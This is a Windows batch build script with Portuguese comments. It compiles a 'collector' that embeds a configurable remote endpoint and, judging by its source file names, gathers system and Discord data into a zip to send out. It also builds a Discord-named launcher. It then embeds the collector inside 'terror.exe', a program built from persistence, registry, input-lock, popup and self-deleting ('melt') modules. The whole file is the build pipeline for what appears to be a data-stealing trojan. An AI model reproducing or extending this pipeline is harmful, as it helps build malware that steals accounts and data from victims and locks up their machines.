@echo off
call "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"

rem ── Endpoint do collector (primeiro argumento) ────────────────────────────
set ENDPOINT=%~1
if "%ENDPOINT%"=="" (
    echo [AVISO] Nenhum endpoint. Uso: build.bat http://servidor:porta/rota
    echo [AVISO] Usando padrao: http://localhost:3000/profile
    set ENDPOINT=http://localhost:3000/profile
)
echo [*] Endpoint collector: %ENDPOINT%

rem ── 1/4: Compila collector.exe (com endpoint embutido) ───────────────────
echo.
echo [1/4] Compilando collector.exe...
cd /d "C:\Users\ildin\cheat\Troll\collector"
echo #define COLLECTOR_ENDPOINT "%ENDPOINT%" > endpoint.h

rem Compila launcher primeiro (embutido no collector)
cl /EHsc /O2 /MT /std:c++17 launcher.cpp user32.lib shell32.lib ws2_32.lib /Fe:discord_launcher.exe /link /subsystem:console > build_launcher.log 2>&1
if %errorlevel% neq 0 (
    type build_launcher.log
    echo [ERRO] Falha ao compilar discord_launcher.exe
    pause & exit /b 1
)

rc.exe /nologo resources.rc > build_resources.log 2>&1
if %errorlevel% neq 0 (
    type build_resources.log
    echo [ERRO] Falha ao compilar resources.rc do collector
    pause & exit /b 1
)

cl /EHsc /O2 /MT /std:c++17 /I. main.cpp zip_writer.cpp sysinfo.cpp discord.cpp resources.res winhttp.lib advapi32.lib shell32.lib crypt32.lib bcrypt.lib /Fe:collector.exe > build_collector.log 2>&1

if %errorlevel% neq 0 (
    type build_collector.log
    echo [ERRO] Falha ao compilar collector.exe
    pause & exit /b 1
)
echo [OK] collector.exe pronto.

rem ── 2/4: Compila recursos do troll (embute collector.exe) ─────────────────
echo.
echo [2/4] Compilando recursos do troll...
cd /d "C:\Users\ildin\cheat\Troll"
rc.exe /nologo resources.rc

if %errorlevel% neq 0 (
    echo [ERRO] Falha ao compilar resources.rc
    pause & exit /b 1
)
echo [OK] resources.res pronto.

rem ── 3/4: Compila terror.exe (com collector embutido) ─────────────────────
echo.
echo [3/4] Compilando terror.exe...
cl /EHsc /O2 /MT /std:c++17 ^
    main.cpp globals.cpp helper.cpp registry.cpp persistence.cpp ^
    input_lock.cpp wallpaper.cpp beep.cpp popup.cpp melt.cpp ^
    resources.res ^
    user32.lib gdi32.lib shcore.lib advapi32.lib winmm.lib shell32.lib ^
    /Fe:terror.exe ^
    /link /subsystem:windows

if %errorlevel% == 0 (
    echo.
    echo ============================================
    echo  [OK] terror.exe compilado com sucesso!
    echo  Endpoint: %ENDPOINT%
    echo  Collector embutido: SIM
    echo ============================================
) else (
    echo [ERRO] Falha na compilacao do terror.exe
)
pause
